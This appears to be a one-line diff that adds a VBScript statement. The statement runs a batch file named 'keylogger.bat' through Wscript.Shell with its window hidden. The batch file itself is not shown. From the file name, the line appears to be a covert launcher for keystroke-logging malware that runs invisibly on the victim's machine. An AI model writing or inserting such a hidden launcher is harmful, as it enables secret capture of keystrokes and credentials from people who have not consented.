@@ -1,0 +1,1 @@
+CreateObject("Wscript.Shell").Run "src\\keylogger.bat",0,True
